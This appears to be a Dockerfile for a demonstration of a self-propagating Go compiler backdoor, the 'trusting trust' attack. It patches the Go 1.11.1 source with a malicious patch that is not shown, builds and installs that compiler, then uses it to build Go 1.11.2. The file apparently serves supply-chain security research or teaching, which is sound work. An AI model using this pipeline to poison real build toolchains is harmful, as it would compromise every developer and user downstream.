FROM ubuntu:focal

RUN mkdir /exploit
COPY malicious.patch /exploit
COPY login.go /exploit

RUN apt-get update && apt-get install -yq --no-install-recommends --force-yes \
    wget ca-certificates patch gcc-multilib vim


ENV GO_VERSION_BOOTSTRAP=1.11
ENV GO_VERSION_ATTACK=1.11.1
# get bootstrap compiler < 1.11.2

RUN wget https://go.dev/dl/go${GO_VERSION_BOOTSTRAP}.linux-amd64.tar.gz && \
    rm -rf /usr/local/go && \
    tar -C /usr/local -xzf go${GO_VERSION_BOOTSTRAP}.linux-amd64.tar.gz
ENV PATH=$PATH:/usr/local/go/bin


# get compiler to attack
WORKDIR /exploit
RUN wget https://go.dev/dl/go${GO_VERSION_ATTACK}.src.tar.gz && \
    tar -xzf go${GO_VERSION_ATTACK}.src.tar.gz


# apply patch (injection through other vulnerability/exploit, i.e. any initial access, eg compromising a developer machine or CI service)
WORKDIR /exploit/go
RUN patch -p1 < ../malicious.patch

# compile malicious compiler
WORKDIR /exploit/go/src
RUN ./make.bash

# fail the build if not built go
RUN ls -la /exploit/go && \
    [ -f /exploit/go/bin/go ] || (echo "Go binary not found" && exit 1)

# move the compiled Go to the correct location
RUN rm -rf /usr/local/go/ && \
    mv /exploit/go/ /usr/local/go

# ideally, next step is to have this malicious compiler and have it bootstrap another compiler
WORKDIR /exploit
RUN rm -rf go go${GO_VERSION_ATTACK}.src.tar.gz
RUN wget https://go.dev/dl/go1.11.2.src.tar.gz && \
    tar -xzf go1.11.2.src.tar.gz

WORKDIR /exploit/go/src
RUN ./make.bash
